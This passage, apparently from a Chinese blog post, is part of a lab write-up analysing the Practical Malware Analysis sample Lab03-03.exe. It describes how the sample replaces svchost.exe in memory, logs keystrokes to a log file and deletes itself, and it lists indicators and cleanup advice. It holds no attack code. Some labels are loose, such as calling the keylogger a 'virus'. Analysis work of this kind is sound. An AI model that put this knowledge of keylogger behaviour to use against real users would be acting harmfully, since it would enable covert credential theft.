id="2-1-4-结论"><a href="#2-1-4-结论" class="headerlink" title="2.1.4 结论"></a>2.1.4 结论</h5><p>每次运行<code>Lab03-03.exe</code>都会生成一个新的异常<code>svchost.exe</code>文件，然后<code>Lab03-03.exe</code>进程自删除，考虑该恶意代码的行为是替换<code>svchost.exe</code></p><h4 id="2-2-可以找出任何的内存修改行为吗？"><a href="#2-2-可以找出任何的内存修改行为吗？" class="headerlink" title="2.2 可以找出任何的内存修改行为吗？"></a>2.2 可以找出任何的内存修改行为吗？</h4><h5 id="2-2-1-查看正常svchost-exe的文件属性"><a href="#2-2-1-查看正常svchost-exe的文件属性" class="headerlink" title="2.2.1 查看正常svchost.exe的文件属性"></a>2.2.1 查看正常<code>svchost.exe</code>的文件属性</h5><p>在Strings中看到Memory映像和Image映像中的内容相同：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025133644444.png" alt="image-20221025133644444"></p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025133702496.png" alt="image-20221025133702496"></p><h5 id="2-2-2-查看异常svchost-exe的文件属性"><a href="#2-2-2-查看异常svchost-exe的文件属性" class="headerlink" title="2.2.2 查看异常svchost.exe的文件属性"></a>2.2.2 查看异常<code>svchost.exe</code>的文件属性</h5><p>在Strings中看到Memory映像中有疑似键盘按键的字符串和日志字符串：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025133058226.png" alt="image-20221025133058226"></p><p>Image映像中没有疑似键盘按键的字符串和日志字符串：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025133224755.png" alt="image-20221025133224755"></p><p>对比Image映像和Memory映像中的<code>svchost.exe</code>，发现二者区别很大</p><h5 id="2-2-3-结论"><a href="#2-2-3-结论" class="headerlink" title="2.2.3 结论"></a>2.2.3 结论</h5><p>经初步分析，考虑该恶意代码是一个键盘记录器，可能会将键盘记录保存到<code>practicalmalwareanalysis.log</code>文件中</p><h4 id="2-3-这个恶意代码在主机上的感染迹象特征是什么？"><a href="#2-3-这个恶意代码在主机上的感染迹象特征是什么？" class="headerlink" title="2.3 这个恶意代码在主机上的感染迹象特征是什么？"></a>2.3 这个恶意代码在主机上的感染迹象特征是什么？</h4><h5 id="2-3-1-Process-Monitor监控异常svchost-exe"><a href="#2-3-1-Process-Monitor监控异常svchost-exe" class="headerlink" title="2.3.1 Process Monitor监控异常svchost.exe"></a>2.3.1 Process Monitor监控异常<code>svchost.exe</code></h5><p>查看异常<code>svchost.exe</code>的PID值：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025134510852.png" alt="image-20221025134510852"></p><p>在Process Monitor中设置监控指定进程：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025134621567.png" alt="image-20221025134621567"></p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025134642545.png" alt="image-20221025134642545"></p><h5 id="2-3-2-测试恶意代码行为"><a href="#2-3-2-测试恶意代码行为" class="headerlink" title="2.3.2 测试恶意代码行为"></a>2.3.2 测试恶意代码行为</h5><p>新建一个.txt文本文档，键盘输入一个字符串：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025135659338.png" alt="image-20221025135659338"></p><p>设置Process Monitor监控<code>CreateFile</code>和<code>WriteFile</code>行为：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025134958557.png" alt="image-20221025134958557"></p><p>观察发现该进程在反复创建和写入<code>parcticalmalwareanalysis.log</code>文件：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025135214790.png" alt="image-20221025135214790"></p><p>根据Path显示的路径，查看<code>practicalmalwareanalysis.log</code>文件内容：</p><p><img src="/2022/10/26/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98Lab3-3/image-20221025135747172.png" alt="image-20221025135747172"></p><p>该文件记录了所有键盘输入内容和打开的程序</p><h5 id="2-3-3-结论"><a href="#2-3-3-结论" class="headerlink" title="2.3.3 结论"></a>2.3.3 结论</h5><p>感染迹象特征：在恶意代码所在路径下创建<code>practicalmalwareanalysis.log</code>日志文件，用于保存键盘输入记录和主机打开文件的记录</p><h4 id="2-4-这个恶意代码的目的是什么？"><a href="#2-4-这个恶意代码的目的是什么？" class="headerlink" title="2.4 这个恶意代码的目的是什么？"></a>2.4 这个恶意代码的目的是什么？</h4><p>该恶意代码创建一个异常<code>svchost.exe</code>用以混淆视听，隐藏自己，通过<code>svchost.exe</code>启动一个键盘记录器，监控记录用户的键盘记录，将键盘输入存入<code>practicalmalwareanalysis.log</code>文件中，最终目的可能是为了获得用户的账号密码。</p><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3.  总结"></a>3.  总结</h3><h4 id="3-1-恶意代码名称"><a href="#3-1-恶意代码名称" class="headerlink" title="3.1 恶意代码名称"></a>3.1 恶意代码名称</h4><p>Lab03-03.exe</p><h4 id="3-2-恶意代码类型"><a href="#3-2-恶意代码类型" class="headerlink" title="3.2 恶意代码类型"></a>3.2 恶意代码类型</h4><p>计算机病毒</p><h4 id="3-3-恶意代码大小"><a href="#3-3-恶意代码大小" class="headerlink" title="3.3 恶意代码大小"></a>3.3 恶意代码大小</h4><p>52.0 KB (53,248 字节)</p><h4 id="3-4-传播方式"><a href="#3-4-传播方式" class="headerlink" title="3.4 传播方式"></a>3.4 传播方式</h4><p>复制</p><h4 id="3-5-相关文件"><a href="#3-5-相关文件" class="headerlink" title="3.5 相关文件"></a>3.5 相关文件</h4><p>无</p><h4 id="3-6-恶意代码具体行为"><a href="#3-6-恶意代码具体行为" class="headerlink" title="3.6 恶意代码具体行为"></a>3.6 恶意代码具体行为</h4><p>记录主机键盘输入</p><h4 id="3-7-感染类型"><a href="#3-7-感染类型" class="headerlink" title="3.7 感染类型"></a>3.7 感染类型</h4><p>复制</p><h4 id="3-8-开放工具"><a href="#3-8-开放工具" class="headerlink" title="3.8 开放工具"></a>3.8 开放工具</h4><p>PEiD</p><p>Dependency Walker</p><p>Process Explorer</p><p>Process Monitor</p><h4 id="3-9-加壳类型"><a href="#3-9-加壳类型" class="headerlink" title="3.9 加壳类型"></a>3.9 加壳类型</h4><p>未加壳</p><h2 id="三、清理方式"><a href="#三、清理方式" class="headerlink" title="三、清理方式"></a>三、清理方式</h2><p>使用反病毒软件查杀病毒，如：火绒安全、小红伞……</p>]]></content>
    
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
